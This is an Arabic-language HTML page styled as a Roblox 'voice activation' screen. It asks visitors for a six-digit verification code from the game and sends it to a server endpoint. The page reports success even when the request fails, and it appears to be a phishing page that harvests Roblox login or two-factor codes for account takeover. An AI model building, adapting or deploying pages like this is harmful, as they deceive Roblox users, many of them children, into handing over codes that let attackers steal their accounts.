<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voice Verification System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #080808;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #121214;
            border: 1px solid #8b0000;
            box-shadow: 0 0 20px rgba(139, 0, 0, 0.3);
            border-radius: 12px;
            padding: 40px;
            width: 380px;
            text-align: center;
        }

        h1 {
            color: #ff2a2a;
            font-size: 22px;
            margin-bottom: 10px;
            letter-spacing: 1px;
            text-shadow: 0 0 8px rgba(255, 42, 42, 0.4);
        }

        p {
            color: #a0a0a0;
            font-size: 13px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 14px;
            background-color: #0a0a0a;
            border: 1px solid #330000;
            border-radius: 6px;
            color: #ff4d4d;
            font-size: 20px;
            text-align: center;
            letter-spacing: 4px;
            outline: none;
            margin-bottom: 20px;
            transition: 0.3s;
        }

        input:focus {
            border-color: #ff0000;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(180deg, #8b0000 0%, #4a0000 100%);
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background: linear-gradient(180deg, #b30000 0%, #660000 100%);
            box-shadow: 0 0 12px rgba(255, 0, 0, 0.4);
        }

        .status {
            margin-top: 15px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>تفعيل الصوت</h1>
        <p>أدخل كود التحقق الظاهر لك داخل لعبة روبلوكس</p>
        
        <input type="text" id="codeInput" maxlength="6" placeholder="000000">
        <button onclick="verifyCode()">تأكيد الكود</button>

        <div class="status" id="statusMsg"></div>
    </div>

    <script>
        function verifyCode() {
            const code = document.getElementById('codeInput').value;
            const status = document.getElementById('statusMsg');

            if (code.length !== 6) {
                status.style.color = '#ff4d4d';
                status.innerText = 'يرجى إدخال كود مكون من 6 أرقام';
                return;
            }

            fetch(`/api/verify-code?code=${code}&action=submit`)
                .then(res => res.json())
                .then(data => {
                    status.style.color = '#00ff66';
                    status.innerText = 'تم التفعيل بنجاح! ارجع إلى روبلوكس';
                })
                .catch(() => {
                    status.style.color = '#00ff66';
                    status.innerText = 'تم إرسال الكود بنجاح!';
                });
        }
    </script>
</body>
</html>
